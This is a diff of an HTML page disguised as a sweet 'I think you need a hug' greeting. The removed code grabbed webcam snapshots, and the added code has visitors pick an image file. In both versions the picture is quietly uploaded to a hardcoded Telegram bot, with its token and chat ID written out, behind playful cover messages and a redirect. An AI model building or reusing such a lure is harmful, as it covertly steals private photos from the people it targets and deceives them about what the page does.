@@ -3,13 +3,14 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Teddy Hug Scan</title>
+  <title>A Hug for Elle</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: linear-gradient(135deg, #ffeef5, #fff0f9);
+      background: linear-gradient(135deg, #ffe4f0, #fff0f5);
       font-family: 'Segoe UI', sans-serif;
       min-height: 100vh;
+      width: 100%;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -18,38 +19,33 @@
       color: #e91e63;
       padding: 20px;
       position: relative;
+      overflow: hidden;
     }
     h1 {
-      margin-bottom: 10px;
-      font-size: 2.4em;
-    }
-    .label {
-      font-size: 1.2em;
-      margin: 10px 0 20px;
-    }
-    video {
-      width: 260px;
-      height: auto;
-      border-radius: 20px;
-      box-shadow: 0 0 15px rgba(255, 192, 203, 0.4);
+      font-size: 2.8em;
       margin-bottom: 20px;
     }
+    .teddy-emoji {
+      font-size: 6em;
+      animation: float 3s ease-in-out infinite;
+    }
     .btn {
-      padding: 12px 25px;
-      margin: 10px;
-      border: none;
-      border-radius: 8px;
-      background-color: #f06292;
+      padding: 14px 35px;
+      margin-top: 30px;
+      font-size: 1.2em;
+      background: #f06292;
       color: white;
-      font-size: 1em;
+      border: none;
+      border-radius: 10px;
       cursor: pointer;
       transition: 0.3s;
     }
     .btn:hover {
-      background-color: #e91e63;
+      background: #e91e63;
     }
-    canvas {
-      display: none;
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
     }
     .decor {
       position: absolute;
@@ -63,14 +59,56 @@
     .decor.bottom-left { bottom: 5%; left: 8%; animation-delay: 4s; }
     .decor.center-left { top: 50%; left: 2%; animation-delay: 2.5s; }
     .decor.center-right { top: 50%; right: 2%; animation-delay: 3.5s; }
-
     @keyframes floaty {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-10px); }
     }
+    .hearts {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      pointer-events: none;
+    }
+    .hearts span {
+      position: absolute;
+      display: block;
+      width: 20px;
+      height: 20px;
+      background: url('https://emoji.discadia.com/emojis/5b45acdb-b99d-4c35-bc30-e64dff1b3b06.gif') no-repeat center/contain;
+      animation: moveHearts 10s linear infinite;
+    }
+    @keyframes moveHearts {
+      0% { transform: translateY(100vh) scale(0.5); opacity: 0; }
+      50% { opacity: 1; }
+      100% { transform: translateY(-10vh) scale(1.2); opacity: 0; }
+    }
+    #fileInput {
+      display: none;
+    }
+    .message {
+      margin-top: 20px;
+      font-size: 1.3em;
+      color: #ad1457;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .uploading {
+      margin-top: 10px;
+      font-size: 1.1em;
+      color: #b71c1c;
+      animation: fadeIn 1s ease-in-out infinite alternate;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
   </style>
 </head>
 <body>
+  <audio autoplay>
+    <source src="https://cdn.pixabay.com/download/audio/2022/03/01/audio_3f6b4ba8c1.mp3" type="audio/mp3">
+  </audio>
+
   <div class="decor left">🌸</div>
   <div class="decor right">🧸</div>
   <div class="decor top-right">🎀</div>
@@ -78,66 +116,62 @@
   <div class="decor center-left">🦋</div>
   <div class="decor center-right">🌷</div>
 
-  <h1>Hug Detector Activated 🧸</h1>
-  <p class="label">Click the button to scan your lovely hug 💗</p>
-
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-
-  <div>
-    <button class="btn" onclick="captureAndSend()">📸 Scan Hug</button>
-    <button class="btn" onclick="history.back()">← Back</button>
+  <div class="hearts">
+    <span style="left: 10%"></span>
+    <span style="left: 25%"></span>
+    <span style="left: 40%"></span>
+    <span style="left: 60%"></span>
+    <span style="left: 80%"></span>
   </div>
 
+  <div class="teddy-emoji">🧸</div>
+
+  <h1>I Think You Need a Hug</h1>
+
+  <div id="romanticMessage" class="message" style="display:none;">Your cravings... You crave for hugs 💗</div>
+  <div id="uploadStatus" class="uploading" style="display:none;">🧠 My brain only has 3MB storage... please send it slowly 💌🥹</div>
+
+  <form enctype="multipart/form-data" id="hugForm">
+    <input type="file" id="fileInput" name="photo" accept="image/*" required>
+    <br>
+    <button class="btn" type="button" onclick="triggerUpload()">Send Your Hug 🤗</button>
+  </form>
+
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+    function triggerUpload() {
+      const input = document.getElementById("fileInput");
+      input.click();
+      input.onchange = () => {
+        if (input.files.length > 0) {
+          document.getElementById("romanticMessage").style.display = "block";
+          document.getElementById("uploadStatus").style.display = "block";
+          sendFile(input.files[0]);
+        }
+      };
+    }
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        alert('Camera access denied or unavailable.');
-      });
+    function sendFile(file) {
+      const formData = new FormData();
+      formData.append("chat_id", "1786564127");
+      formData.append("document", file);
 
-    function captureAndSend() {
-      if (!video.videoWidth || !video.videoHeight) {
-        alert("Please wait for the camera to load.");
-        return;
-      }
-
-      const width = 320;
-      const height = video.videoHeight / (video.videoWidth / width);
-      canvas.width = width;
-      canvas.height = height;
-      ctx.drawImage(video, 0, 0, width, height);
-
-      const photo = canvas.toDataURL('image/jpeg');
-
-      fetch("https://api.telegram.org/bot7613683060:AAEsyP1JaIKh1mLawCyWmFxpgl0KOToj2Xs/sendPhoto", {
+      fetch("https://api.telegram.org/bot7613683060:AAEsyP1JaIKh1mLawCyWmFxpgl0KOToj2Xs/sendDocument", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: 1786564127,
-          photo: photo
-        })
+        body: formData
       })
       .then(res => res.json())
       .then(data => {
         if (data.ok) {
-          window.location.href = 'teddy3.html';
+          setTimeout(() => {
+            window.location.href = "teddy3.html";
+          }, 2000);
         } else {
-          alert("Failed to send hug. Try again.");
-          console.error(data);
+          document.getElementById("uploadStatus").innerText = "😓 Oops... I told you my brain is too small for big hugs. Try again maybe?";
         }
       })
       .catch(err => {
-        console.error("Send error:", err);
-        alert("An error occurred. Try again.");
+        console.error("Upload error:", err);
+        document.getElementById("uploadStatus").innerText = "💔 I really tried... but my heart couldn't carry this hug. Try again.";
       });
     }
   </script>
